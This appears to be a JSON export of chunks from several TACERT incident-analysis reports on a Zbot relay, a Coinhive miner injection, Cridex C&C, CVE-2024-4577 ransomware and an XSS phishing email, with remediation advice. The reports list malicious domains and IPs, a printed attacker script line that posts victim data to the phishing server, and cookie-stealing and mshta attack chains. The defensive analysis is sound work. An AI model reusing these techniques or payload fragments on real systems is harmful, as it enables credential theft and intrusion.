        "content": "Step 3-2 : POST confideracia.ru/ from 140.117.164.154 to 176.56.225.146 Step 1-1 Step 2-1 Step 3-1 Step 1-2 Step 2-2 Step 3-2 Zbots Taiwan Proxy 140.117.164.154 Netherlands C&C 176.56.225.146 ......................... HTTP POST  5 圖四、 HTTP Relay 資料架構圖 7. Fast-flux domain name:藍色為http proxy。 Domain name Mapping IP Zbots Content Bots Countries ochengorit.ru ***.***.164.154 49449 ./files/config.dll 134 confideracia.ru condalinaradushko.ru 178.209.126.87 188.32.153.31 201.65.23.153 212.179.221.31 222.200.187.83 ***.***.164.154 18452 ./files/gw01 ./files/cit_ffcookie.module ./files/cit_video.module 69 pizdecnujzno.ru ***.***.164.154 8840 ./files/soft.exe ./files/config.dll 110 xenaidaivanov.ru 201.65.23.153 178.209.126.87 188.32.153.31 222.200.187.83 212.179.221.31 ***.***.164.154 1095 text/html 35 garohoviesupi.ru ***.***.164.154 915 text/html 11 condalinradishevo.ru 212.179.221.31 201.65.23.153 178.209.126.87 114.4.27.219 222.200.187.83 ***.***.164.154 437 ./files/uh03 ./files/cit_video.module 8 toldia.com ***.***.164.154 311 ./files/citfrtr_updates.msi 5 ernutkskiepro.ru ***.***.164.154 71 ./files/uh03.exe 5 mifiesta.ru 114.4.27.219 124.9.128.164 188.32.153.31 201.65.23.153 99.61.57.201 ***.***.164.154 10 ./ld/gate.php 8 8.",
        "Page_Num": "4,5"
    },
    "82": {
        "File_Name": "個案分析-Botnet C&C中繼站分析報告_10206.pdf",
        "content": "建議措施: A. 遠端連線SSH 的帳號密碼定時更新。 B. 限制最大權限管理者遠端登入之網段。 C. 密碼使用英數與特殊符號夾雜的較長字串。 D. 不與其他人共享帳號密碼。 ",
        "Page_Num": "5"
    },
    "83": {
        "File_Name": "個案分析-Coinhive網頁挖礦事件分析報告_10701.pdf",
        "content": "個案分析- Coinhive 網頁掛碼挖礦 事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 107 年1 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 2017 年9 月Coinhive 等網頁挖礦程式被濫用,綁架用戶電腦挖礦的非法行 為日發嚴重,不只個人電腦,連智慧型手機也將受到威脅。 2. Coinhive 是一個可在瀏覽器環境下,用 JavaScript 執行門羅幣(Monero)挖 礦計算的程式。 3. Coinhive 也是一種新型態的網站經營商業模式,以網頁瀏覽者的電腦 CPU 進行挖礦,採用該類挖礦服務的網站會明確告知使用者本站使用挖礦服務, 但有些網站則可能在未知狀態下被駭客入侵、掛碼,並進行挖礦。 4. 本次事件為在2017 年11 月學術網路內發現某學校執行教育部某計畫之網站 被植入Coinhive 的JavaScript 程式碼,淪為一個挖礦網站之資安事件,為了 解在使用者瀏覽網站時所產生的主機挖礦行為,本中心進行實際檢測。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team II. 事件檢測 1. 首先,使用瀏覽器開啟受測網站之首頁,發現建置該網站所使用的軟體版本 未隱藏,如WordPress 4.9.1 與jQuery 1.12.4,容易讓駭客利用這些軟體的版 本漏洞進行網站入侵。 2. 使用Nmap 工具掃描受測網站IP(140.X.X.150),發現該網站主機開啟14 個 port,容易造成駭客透過這些port 進行系統入侵,建議網站管理員檢視這些 port 之存在必要性。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 檢視受測網站首頁的原始碼發現到有網頁掛碼之現象,被植入Coinhive 挖礦 程式的JavaScript 語法,可見該網站曾被駭客入侵。 4. 瀏覽該網站其他頁面發現一樣有被植入Coinhive 挖礦程式的JavaScript 語 法,可以得知不論",
        "Page_Num": "1,2,3,4"
    },
    "84": {
        "File_Name": "個案分析-Coinhive網頁挖礦事件分析報告_10701.pdf",
        "content": "使用者瀏覽至該網站哪一頁面,挖礦程式都會被下載並進 行挖礦。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 將受測網站的網址送至Virustotal 網站檢測,發現檢測率為0/66,判定為Clean site,由此可知此類網頁掛碼的挖礦情形無法被各家防毒軟體公司檢測出來。 6. 觀察瀏覽受測網站時主機之CPU 實際運作情形,發現CPU 的使用率有衝高 至100%之現象,但當網頁關閉後瞬間恢復正常。 7. 解讀受測網站被植入的Coinhive 挖礦程式之JavaScript 語法,分析如下:  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (1)至coin-hive.com 網站下載無通知的Coinhive 挖礦程式。 (2)使用JavaScript 來啟動Coinhive 挖礦程式。 A.「np0gtkzs4A2AUhhBktnJZTAyzA7op7QD」是在駭客完成註冊Coinhive 帳號後所取得的Site Key(public)。 B. 「threads:2」是指礦工應該從頭開始的線程數,即主機內可用的CPU 核 心數量。 C.「miner.start();」指連線礦池並開始挖礦。 D.「setInterval (function(){...var acceptedHashes=miner.getAcceptedHashes();」 為每秒更新一次即時的挖礦統計資訊,包含目前即時的每秒計算的 hash  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 數目(挖礦速度)、累計 hash 數目以及獲得的門羅幣總金額。 E.「document.getElementById(“11”).textContent...=acceptedHashes」為輸出 統計資訊,駭客可以登入Coinhive 網站後在Dashboard 頁面中看到即時 的挖礦統計資訊。 8. 檢視瀏覽器連線狀態,發現該瀏覽器除了連線至受測網站(IP:140.x.x.150)外,",
        "Page_Num": "4,5,6,7"
    },
    "85": {
        "File_Name": "個案分析-Coinhive網頁挖礦事件分析報告_10701.pdf",
        "content": "也會連線至IP:94.130.129.235,經查此為coin-hive.com 的網站IP。 9. 將網址「https://coin-hive.com/lib/coinhive.min.js」送至Virustotal 網站檢測, 發現偵測率僅4/66,只有四家防毒軟體公司能檢測出此網址為Malicious site。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 將受測網站首頁完整地另存新檔後,發現資料夾中有一個「coinhive.min.js. 下載」的檔案,將檔案送至Virustotal 檢測發現其為惡意之比例有30/58,其 中有許多防毒軟體公司判定它為挖礦程式(Miner)。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team III. 網路架構圖  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 駭客入侵Web Server 並進行Coinhive 挖礦程式之網頁掛碼。 2. 受害者透過瀏覽器瀏覽已被掛碼的網頁。 3. 在未通知受害者狀態下,下載Coinhive 挖礦程式至受害主機。 4. 受害主機在受害者瀏覽網頁期間默默執行Coinhive 挖礦程式,導致受害 主機CPU 效能瞬間衝高至100%。 IV. 建議與總結 1. 由於網頁挖礦程式應用普遍,很多網站都會想利用這種新的商業模式來賺 錢,一般使用者如果想要辨別一個網站是否在背後偷偷挖礦,可從挖礦網 站的常見特徵進行判斷,特徵詳列如下。 (1)使用者瀏覽器的CPU 使用率在瀏覽網站的時候特別高,有達 100% 的 情況,而且持續非常久。 (2)網站之網頁原始碼內出現Coinhive 挖礦程式的JavaScript 語法,但 如果將 JavaScript 經過最小化編譯之後,又把檔案名稱改掉的話, 就無法輕易看出來,只能從瀏覽器的對外連線來查詢。 2. 相對傳統網站透過廣告投放方式獲利,挖礦或許能取得更高的利潤,但使 用者若想",
        "Page_Num": "7,8,9,10"
    },
    "86": {
        "File_Name": "個案分析-Coinhive網頁挖礦事件分析報告_10701.pdf",
        "content": "阻止這種竊取運算資源的舉動,可透過像Adblock Plus 的阻擋廣 告軟體,加入過濾條件,過濾掉挖礦程式,或者在瀏覽器中加入阻擋挖礦 程式外掛,如採用No Coin 這款套件,避免電腦受到影響。 Adblock Plus 的設定方式 (1)將Adblock Plus 以擴充功能方式新增至Chrome 瀏覽器中。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2)在Adblock Plus 選項中新增過濾條件coin-hive.com/lib/coinhive.min.js。 (3)開啟已被網頁掛碼的網站,查看是否有成功阻擋,可以看到有被過濾 的統計數據,而CPU 使用率在挖礦程式被過濾掉後瞬間下降。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team No Coin 的設定方式 (1)在瀏覽器Chrome 中可加入No Coin 此擴充功能程式,安裝完成後保 護功能就會立即生效。 (2)當使用者打開的網頁帶有Coinhive 挖礦程式時,瀏覽器右上角的圖標 會出現驚嘆號警告,點開來會告訴使用者「A coin miner has been detected on this page」在這個頁面上發現挖礦程式,同時該挖礦程式已被阻擋。 3. 本次資安事件為駭客入侵網站伺服器進行網頁掛碼造成,又該網站主機開 啟許多port,這些port 容易變成駭客入侵的管道,建議網站管理員檢視 網站整體的資訊安全防護與確認已開啟的port 之用途,並且加強密碼強 度來控管網站系統管理的登入作業。 4. 受感染網站移除Coinhive 挖礦程式的方式  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (1) 需有受感染網站的網站管理員權限。 (2) 查找含有Coinhive 來源程式碼所在位置,類似下面JavaScript 語法。 (3) 確定Coinhive 的惡意程式碼所在位置後,手動刪除此惡意程式碼。 V. 相關報導 1. 【災情持續擴大,全球每天新增300 個挖礦網站】黑色產業覬 覦",
        "Page_Num": "10,11,12,13"
    },
    "87": {
        "File_Name": "個案分析-Coinhive網頁挖礦事件分析報告_10701.pdf",
        "content": "瀏覽器挖礦,5 億訪客不知電腦變礦工 https://www.ithome.com.tw/news/117995 2. 星巴克店內Wi-Fi 遭加料!合作廠商暗藏挖礦程式,偷用顧客 筆電CPU 來賺錢 https://www.ithome.com.tw/news/119518  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 下載超過10 萬次的Chrome 擴充程式Archive Poster 遭植入採 礦程式 https://www.ithome.com.tw/news/120044 ",
        "Page_Num": "13,14"
    },
    "88": {
        "File_Name": "個案分析-Cridex C&C分析報告.pdf",
        "content": "1 個案分析- Cridex C&C 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2013/04  2 事件說明 TWCERT 接到國外舉報,TANET 主機成為Cridex C&C 主機。Cridex 是一個專取金融 資料的特洛伊惡意程式,國外資安單位表示他們有許多Cridex 的樣本,其上層都是連往 某個TANET 主機:163.xx.107.65。 163.xx.107.65 是C 國小的官網主機,底層作業系統為CentOS,主機除了網頁伺服器, 也提供FTP(使用ProFTPD 套件)讓老師上傳分享資料,FTP 的帳號密碼只有一組,全 校通用。國外提供的檢舉資料顯示(圖1),Cridex 的許多bots 樣本與163.xx.107.65 的 8080 port 有往來連線。 追蹤163.xx.107.65 主機的連線狀態也顯示其8080 port 的確有多個來自不同國家的IP 與 之連線(圖2),163.xx.107.65 主機上層則僅有x.61.36.44。另外從圖2 也可以看到,惡 意的網路活動PID 為26812 程式名稱為ld-linux.so.2。 圖1 國外單位檢附的佐證資料  3 圖2 163.xx.107.65 主機的網路狀態 圖3 網路活動概念圖 ld-linux.so.2放置路徑為[/tmp/.estbuild/lib/ ld-linux.so.2],由圖4可以看到放置ld-linux.so.2 的是一個隱藏資料夾[/tmp/.estbuild/],資料夾擁有者和群組為cgesftp,這是該台主機的 FTP 帳號,如果設定恰當cgesftp 應該僅能在FTP 的上傳目錄活動且不能使用SSH 登入。 但是在主機的Log 中可以看到如圖5 的紀錄,89.149.223.104 使用cgesftp 帳號成功登入 了三次,其中第二次的登入時間為[Jan 31 21:38:25],這個時間剛好與[/t",
        "Page_Num": "1,2,3"
    },
    "89": {
        "File_Name": "個案分析-Cridex C&C分析報告.pdf",
        "content": "mp/.estbuild/]資 料夾建立的時間相符合,所以可以知道駭客先是得到cgesftp 的密碼之後,利用SSH 登 入植入惡意程式。  4 由於在SSH 登入檔裡面沒有任何關於cgesftp 帳號被暴力攻擊的紀錄,所以推斷駭客得 到cgesftp 帳號密碼並不是透過嘗試SSH 暴力攻擊,有可能是透過其他管道得到FTP 的 帳號密碼後,才拿來登入SSH。 圖4 放置ld-linux.so.2 的資料夾所有者以及群組為cgesftp 圖5 主機所有cgesftp 帳號的SSH 登入紀錄  5 入侵手法推測 建議措施  對SSH 登入的帳號做限制  由於/tmp 沒有設置權限的特性,建議使用獨立的分割區或硬碟掛載/tmp  對所有可以遠端存取的服務設定存取網路位址  資安事件處理完畢後,登入服務的密碼應進行更換避免駭客使用同組帳密再度 登入  6 這個案例中使用的FTP 服務(ProFTPD),在登入帳號的設定上採用實體用戶,意即直 接使用本機端的一般使用者帳號當作FTP 的登入帳號,這種設定雖然方便,但是若沒限 制SSH 登入,則容易因為FTP 帳號密碼被破解而得到一組可以登入SSH 的帳號。Linux 上的/tmp 是一個所有人都可以存取、寫入、刪除的資料夾,由於其特性,建議重要主機 的/tmp 另外獨立掛載。本案例中的C 國小採用一個FTP 帳號全校使用的政策,雖然建 立多個帳號會增加帳號密碼被破解的機率,但是多人使用同一組帳密會使得管理不便, 一般使用者無法隨意更改密碼以確保自己的帳號安全,而由於多人共用,管理者若要進 行定時更改密碼的動作,也會影響許多人員的使用,因此,多人共用的帳號鮮少更改密 碼,甚至在系統重新重灌升級後,密碼仍會維持原先的設定以避免影響人員的使用。當 主機被侵入是因為帳號密碼已經",
        "Page_Num": "3,4,5,6"
    },
    "90": {
        "File_Name": "個案分析-Cridex C&C分析報告.pdf",
        "content": "被駭客得知,而礙於使用者眾,變更密碼會影響許多人 的情況下,有些主機在資安事件發生之後,雖然清除了惡意程式,但仍繼續沿用原本的 帳密,導致駭客仍可以繼續登入進行惡意活動。 參考 http://labs.m86security.com/2012/03/the-cridex-trojan-targets-137-financial-organizations-in- one-go/ ",
        "Page_Num": "6"
    },
    "91": {
        "File_Name": "個案分析-CVE漏洞利用之勒索軟體攻擊事件分析報告.pdf",
        "content": "0 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team TLP:WHITE CVE 漏洞利用之勒索軟體 攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2024 年06 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. PHP 為最常見網站使用語言之一,資料顯示全球有近八成網站使用該 語言撰寫而成。資安公司戴夫寇爾研究人員在2024/05/07 發現PHP 存 在引數注入(Argument Injection)漏洞(CVE-2024-4577),未經身分鑑別之 遠端攻擊者可透過特定字元序列繞過舊有CVE-2012-1823 弱點修補後 之保護,並透過引數注入等攻擊於遠端PHP 伺服器上執行任意程式 碼。在2024/06/06 PHP 開發商發布新版本 8.3.8、8.2.20 與 8.1.29 來修 補此露洞。在2024/06/08 學術網路中有多所學校遭受勒索軟體攻擊, 發生該漏洞利用的事件。 二、 CVE-2024-4577 漏洞 1. CVE-2024-4577 漏洞發生是因PHP 程式語言在設計時忽略 Windows 作業系統內部對字元編碼轉換的最佳化對應( Best-Fit) 特性,導致未認 證的攻擊者可透過特定的字元序列繞過舊有 CVE-2012-1823 的保護; 透過參數注入等攻擊在遠端 PHP 伺服器上執行任意程式碼。 2. 導致CVE-2024-4577 漏洞觸發有兩種可能情形,一種是將PHP 設置於 CGI 模式下執行,另一種則是將PHP 執行檔曝露於CGI 資料夾,即使 未透過CGI 模式執行PHP,也會曝露相關風險。由於安裝Windows 版 XAMPP 的預設組態,也將PHP 執行檔存放於CGI 資料夾,因此使用 這種套件的Windows 主機,也可能受影響。 (1) 將PHP 設置於CGI 模式下執行時常見設定如下: AddHandler cgi-script .php Action",
        "Page_Num": "1,2"
    },
    "92": {
        "File_Name": "個案分析-CVE漏洞利用之勒索軟體攻擊事件分析報告.pdf",
        "content": "cgi-script \"/cgi-bin/php-cgi.exe\" 或者 <FilesMatch \"\\.php$\">  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team SetHandler application/x-httpd-php-cgi </FilesMatch> Action application/x-httpd-php-cgi \"/php-cgi/php-cgi.exe\" (2) XAMPP 預設安裝設定將PHP 執行檔暴露在外之常見設定如下,由 於使用者可以運用 XAMPP 輕易地建立網頁伺服器,Windows 版 本每月下載量超越 200 萬次,至今累計下載量更已突破上億次。因 此,安裝Windows 版XAMPP 的網頁伺服器數量很多,需盡快修補 漏洞。 a. 將 php.exe 或 php-cgi.exe 複製到 /cgi-bin/ 目錄中。 b. 將 PHP 安裝目錄透過 ScriptAlias 暴露到外,如: ScriptAlias /php-cgi/ \"C:/xampp/php/\" 三、 漏洞利用-勒索軟體攻擊事件分析 1. 2024/06/08 學術網路中有多所學校遭受勒索軟體攻擊,這些受攻擊的網 站採用的PHP 版本皆未更新至最新版,存有CVE-2024-4577 漏洞。受 害的網站伺服器皆是在2024/06/08 被攻擊,並且加密網站伺服器內的 檔案。在每個被加密的資料夾內皆有一個READ_ME9.html 檔案,而且 被加密的檔案之副檔名皆為.locked。由副檔名locked 得知屬於 TellYouThePass 勒索軟體家族,而該家族主要通過各種軟體漏洞、系 統漏洞進行散播。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 檢視READ_ME9.html 發現為一個勒索通知信。內文告知受害者支付 0.1 比特幣到其帳戶,並且告訴受害者可透過聯絡信箱或者透過一些資 料復原公司(建議taobao.com 淘寶網)來聯絡他,最後提供一大段亂碼 之受害者id。由",
        "Page_Num": "2,3,4"
    },
    "93": {
        "File_Name": "個案分析-CVE漏洞利用之勒索軟體攻擊事件分析報告.pdf",
        "content": "連絡信箱的「cyberkiller.xyz」得知駭客使用頂級域名 (TLDs)的郵件伺服器,而且因為攻擊者知道taobao.com(中國網站),推 測攻擊者可能懂中文或來自中國。 3. 追蹤學術網路遭受攻擊情形,至2024/06/11 統計受害單位共有22 個, 受害設備共計30 臺。從這些單位受害時間可以推斷出駭客攻擊的三個 時段如下表,而且有兩間學校跨兩個攻擊時段,其中以2024/06/08 15:00~17:30 時段攻擊最密集,受害單位數與設備數最多。此次勒索攻 擊範圍不只有台灣,在國外Bleeping Computer 的資安論壇也有受害者 談論此事。 駭客攻擊時段 受攻擊單位數 受攻擊設備數 2024/06/08 03:00~04:00 4 5 2024/06/08 15:00~17:30 (攻擊最密集) 15 19 2024/06/08 19:30~22:00 5 6 四、 TellYouThePass 勒索軟體 1. TellYouThePass 勒索軟體自 2019 年以來以快速使用公共漏洞利用並 產生廣泛影響而聞名。2023 年11 月它在攻擊中使用了 Apache ActiveMQ RCE,並在2021 年12 月採用了 Log4j 漏洞來攻擊公司。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 針對本次攻擊事件,網路安全公司 Imperva 的研究人員發現 TellYouThePass 利用嚴重程度 CVE-2024-4577 漏洞錯誤執行任意 PHP 程式碼,來使用 Windows mshta.exe 二進位檔案執行惡意HTA 檔案。該檔案包含帶有 base64 編碼字串的 VBScript,該字串可解碼 為二進位檔案,從而將勒索軟體下載到主機記憶體中。 惡意HTA 檔案(資料來源: Imperva) 3. 執行後,勒索軟體會偽裝成 CSS 資源請求,向命令與控制 (C2) 伺 服器發送 HTTP 請求,並對受感染電腦上的檔案進行加密。它會放置 一個勒索通知信「READ_ME10.html」,內容為告訴受害者如何",
        "Page_Num": "4,5"
    },
    "94": {
        "File_Name": "個案分析-CVE漏洞利用之勒索軟體攻擊事件分析報告.pdf",
        "content": "恢復檔 案的說明,並要求贖金 0.1 BTC(約 6,700 美元)作為解密金鑰。 4. 根據資安公司Censys 2024/06/10 的報告,截至2024/06/09 觀察到有超 過 450,000 個暴露的 PHP 伺服器可能容易受到 CVE-2024-4577 RCE 漏洞的影響,其中大部分位於美國和德國。 五、 事件攻擊行為 由本案駭客攻擊行為可畫出下面攻擊行為示意圖,一開始駭客利用 PHP 漏洞呼叫mshta.exe 來執行,接著mshta.exe 執行惡意HTA 檔。之後 VBScript 被解碼後下載勒索軟體TellYouThePass 來執行。在勒索軟體執行 後,緊接著受害主機偽裝CSS 資源請求連線C2 Server,最後勒索軟體加 密受害主機內檔案與產生勒索通知信。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 六、 總結與建議 1. 本次勒索軟體攻擊事件發生的主要原因是因為攻擊者利用 CVE-2024-4577 漏洞呼叫系統內建mshta.exe 來執行惡意HTA 檔,因而 下載勒索軟體TellMeThePass 來執行。在執行勒索軟體後,受害主機會 將系統環境資訊透過偽裝CSS 資源請求的方式,對C2 伺服器發送 HTTP 請求而送出資訊。 2. 在可能影響方面,由於CVE-2024-4577 漏洞影響所有在Windows 環境下 使用PHP 架設的網站,因此它會造成的潛在風險很高。以CIA 判斷,該 類攻擊對機密性、可用性與完整性皆有影響。 3. 在處理方式方面,有下列三點建議提供學校參考。 (1) 在處理本類攻擊事件時,需檢視主機受感染後該勒索軟體是否仍在 背景程序中執行。若是,需中止它後才可處理主機。 (2) 若以備份檔還原網站後,需檢視是否存在網站目錄外露之問題,並 且盡速修補CVE-2024-4577 漏洞 ,以避免再次遭受攻擊。 (3) 若需確認網站是否受影響,管理者可以檢查 Apache HTTP",
        "Page_Num": "5,6"
    },
    "95": {
        "File_Name": "個案分析-CVE漏洞利用之勒索軟體攻擊事件分析報告.pdf",
        "content": "Server 的  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 設定,當網站設定在CGI 模式下執行PHP 或將PHP 執行檔暴露在 外時,該伺服器將容易成為攻擊的目標。需特別注意的是,若使用 XAMPP for Windows 預設安裝設定,也會受此漏洞影響。 4. 在預防方法方面,有四點建議如下提供學校參考。 (1) 由於CVE-2024-4577 漏洞影響所有安裝在 Windows 作業系統上的 PHP 版本,另因PHP 8.0 分支、PHP 7 以及 PHP 5 官方已不再維 護,建議使用這些版本的網站管理員更換成PHP 官方仍有維護之版 本,或採取相應的緩解措施。 (2) 對於無法升級的系統,可以考慮其他暫時緩解措施,如修改Rewrite 規則以阻擋攻擊或取消 PHP CGI 的功能。 (3) 由於 XAMPP 尚未針對此漏洞釋出相對應的更新安裝檔,使用者如 確認自身未使用 PHP CGI 功能,可修改 Apache Httpd 設定檔,以 避免暴露弱點。 (4) 因PHP CGI 被公認為是一種過時且易受攻擊的架構,建議使用者評 估並遷移至更為安全的 Mod-PHP、FastCGI 或 PHP-FPM 等架構。 參考資料 1. 資安通報:PHP 遠端程式碼執行 (CVE-2024-4577) - PHP CGI 參數注入弱 點 https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argume nt-injection-vulnerability/ 2. BleepingComputer 論壇 https://www.bleepingcomputer.com/forums/t/798060/tellyouthepass-ransomware -locked;-read-me9html-support-topic/ 3. TellYouThePass ransomware exploits recent PHP RCE flaw to breach servers https://www.bleepingcomputer.com/news/security/tellyouthepass-ransomware-ex ploits-recent-php-rce-flaw-to-breach-server",
        "Page_Num": "6,7"
    },
    "96": {
        "File_Name": "個案分析-CVE漏洞利用之勒索軟體攻擊事件分析報告.pdf",
        "content": "s/  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. June 10, 2024: PHP-CGI Argument Injection Vulnerability Could Lead to Remote Code Execution https://censys.com/cve-2024-4577/ 5. Update: CVE-2024-4577 quickly weaponized to distribute “TellYouThePass” Ransomware https://www.imperva.com/blog/update-cve-2024-4577-quickly-weaponized-to -distribute-tellyouthepass-ransomware/ ",
        "Page_Num": "7,8"
    },
    "97": {
        "File_Name": "個案分析-C大學-郵件釣魚網站事件.pdf",
        "content": "個案分析- C 大學-郵件釣魚網站事件 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2013/12  1 I. 事件經過: A. 某C 大學的郵件系統為Openfind Mail2000 電子郵件系統。 B. 該校某系所有四位教授同時收到一封來自系上某位K 教授的轉寄信件,而 該信件的標題為『Fw: 老師,有事請教』。 C. 當這封轉寄出的信件由其他老師開啟後會自動登出Web Mail,轉跳至登 入頁面且登入帳號會變成該K 教授的Mail 帳號,並要求重新登入Web Mail。 D. 該校資安人員將可疑的原始信件封存,並請本單位TACERT 檢測。 II. 事件檢測: A. 我們使用VM 虛擬機器,並安裝Win7 (x64)及啟用Wireshark 側錄信件開 啟過程網路封包。 B. 因為我們無該校的郵件帳號於WEB MAIL 測試,故使用Outlook 2010 開啟 該郵件。 C. 信件內容主要為一位戴姓學生向K 教授請教問題,可疑之處是這是一封轉 寄的郵件,開啟後會彈出一個圖片是否顯示的提示訊息,按下顯示圖片後 並無出現圖片。 D. 檢視信件原始碼可以看到該信的HTML 標籤程式,確實有被植入一段惡意 程式碼於信件開啟背景執行,主要是竊取使用者瀏覽器的cookie。 E. 此程式碼中有一個轉跳的網址連結,後方有帶出使用者帳號uid, 『http://112.121.163.172/warlord/mxxf/indexCP.asp』 。  2 F. 測試開啟該網址後出現一個Openfind MAIL2000 的登入畫面,該網站IP 「112.121.163.172」位於香港,明顯是惡意釣魚網頁,一旦輸入個人帳 密就會被竊取。 圖、釣魚網頁,上方的程式碼因為駭客未寫好顯示出來 G. 測試使用該帳號登入,密碼則隨意輸入後,會顯示 「該網站拒絕顯示此 網頁」 的",
        "Page_Num": "1,2,3"
    },
    "98": {
        "File_Name": "個案分析-C大學-郵件釣魚網站事件.pdf",
        "content": "字樣,也就是無法成功登入,因為是偽造的網站,但輸入的資 料已被伺服器接收。  3 H. 嘗試將信件原始碼存成html 檔案用IE 執行,則無法成功如該校老師所反 映的會出現登出再登入的頁面,可能原因為並非用Web Mail 去開啟信件。 III. 側錄流量分析 A. 信件原始碼有一段程式碼(紅框所示)會去插入名為“x”圖片,然而因為 實際上無此圖檔,故會觸發執行onerror 程式碼 “xsscode1” (綠色框 線所示),再去呼叫伺服器的indexCP.asp,也就是釣魚網站的頁面。 B. 程式碼(document.cookie)會將主機的cookie 資料送出給偽造網站。 C. 呼叫indexCP.asp 後伺服器會回覆indexP_1.asp 給用戶端。  4 D. 用戶端向伺服器GET 檔案indexP_1.asp,伺服器則執行回應ncuu.asp。 E. 用戶端向伺服器GET檔案ncuu.asp,解析出該ASP內有段script和iframe 連結,iframe 會參照連結至monitor.asp 並帶入K 教授的Mail 位置。 F. Monitor.asp 主要用來比對用戶端所安裝軟體是否在清單內,伺服器執行 完monitor.asp 回傳的html 程式碼中,會執行一段指令 Save(info,'detect.asp?a=scan&uid=&ip=140.117.X.X&id=&inf='+info );}。  5 圖、detect.asp 偵測軟體清單 G. 用戶端會因為detect.asp 開始傳送(POST)電腦的資料給伺服器,如比對 到的作業系統版本、瀏覽器版本、Outlook 版本等。此例被偵測到Adobe Flash、Win7、IE8、Office2010、Windows Media Player 11。 H. 正式在釣魚網頁輸入帳號和密碼,確實被伺服器所接收成功,此處的密碼 是隨意輸入的字串 “gsdfgfsdgsdfg” 。 ",
        "Page_Num": "3,4,5,6"
    },
    "99": {
        "File_Name": "個案分析-C大學-郵件釣魚網站事件.pdf",
        "content": "6 I. 伺服器接收完後執行<script> top.location.href=‘ ’,會使頁面回到 /warlord/mxxf/,並出現“403 Forbidden”的訊息。因為是偽造的網頁, 所以無法存取內容,此時使用者才會驚覺上當。 IV.事件網路架構圖 Mail Server Hacker STEP 1 Injection STEP 2.1 Phishing STEP 1 : 駭客成功在K教授電腦植入後門程式,方式可能同為釣魚郵件。 STEP 2.1-2.2 : K教授的受感染電腦向系上其他同仁發送惡意釣魚郵件。 STEP 3 : 若有同仁開啟郵件後會轉跳至偽造的Mail Server登入網頁,誘使輸入郵件帳密並竊取。 STEP 4 : 釣魚網頁將收集到的Mail帳號密碼傳給駭客使用。 Professor K Colleague 1 Colleague 2 Colleague 3 Colleague 4 Malicious Mail Phishing Server STEP 2.2 Malicious Mail Malicious Mail STEP 3 Web Log in STEP 4 Report V. 事件結論 A. 此信件為針對性的(APT)社交工程郵件攻擊,信件轉發者K 教授電腦可能 已遭受入侵,並當作駭客的跳板轉發釣魚信件給其他同仁。 B. 其他收到轉發信的同仁於Web Mail 開啟信件後會自動轉跳至釣魚頁面, 讓人誤以為帳號被登出,並誘使輸入自己的帳號密碼重新登入。 C. 信件開啟時使用者電腦的軟體版本資訊和Cookie 會被竊取。 D. 在釣魚頁面一旦輸入帳號密碼就會被駭客所竊取,務必盡快更改密碼。  7 VI. 建議措施 A. 當使用者收到間接或直接相關的信件時,要注意是否會有一些異常現象, 當有非預期現象產生時可能就是惡意郵件。 B. 網頁版的郵件登入時候要注意網頁IP 位址是否正常,偽造的網站通常會 直接用IP 顯示而非網域名稱。 C. 如果不小心在釣魚網頁輸入個人資訊,務必盡速更改帳號密碼以及清除瀏 覽器的cookie 和暫存的紀錄,以防被駭客利用。 D. 強化宣導使用者關於(APT)社交",
        "Page_Num": "7,8"
    },
    "100": {
        "File_Name": "個案分析-C大學-郵件釣魚網站事件.pdf",
        "content": "工程攻擊的資訊安全觀念,以降低使用者 個資外洩的風險。 ",
        "Page_Num": "8"
    },
    "101": {
        "File_Name": "個案分析-C大學的C&C分析報告.pdf",
        "content": "個案分析- C 大學的C&C 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2012/3  1 Taiwan Academic Network Computer emergency Response Team(TACERT) 目錄 概要 ........................................................................................................................................... 2 Zbot 中繼站分析 ...................................................................................................................... 4 特定埠號掃描 ........................................................................................................................... 7 主機其他資料分析 ................................................................................................................. 10  2 Taiwan Academic Network Computer emergency Response Team(TACERT) 概要  主機資訊 所在地及所屬單位:C 大學資工系,提供學生實驗之主機 網路位址:192.168.103.148(IP 已經過處理) 作業系統:ubuntu 10 開啟port 及運行服務:  Port : 22 (ssh)  Port : 80 (nignx http proxy)  事件經過 2012/2/24 技服中心發現異常,許多Zbot 連向192.168.103.148,隨即請C 大學mirror 192.168.103.148 主機封包 2012/3/01 到C 大學取資料,因封包數量太多,mirror 封包的主機早就不堪負荷。當天技服 立即架設另外一組硬體mirror 封包,且只過濾出tcp 的 2012/3/07 取網路pcap 檔案以及主機資料  入侵原因 使用者開放root 帳號遠端登入,並且設定過於簡單的密碼:123  惡意行為 Zbot 中繼站:192.168.103.148 上有由Nignx 套件所架設的Http proxy,提供Zbot 與C&C 間封包 的relay,192.168.103.148 收到Http request 之後,會將流量relay 給位於荷蘭的85.17.138.133。 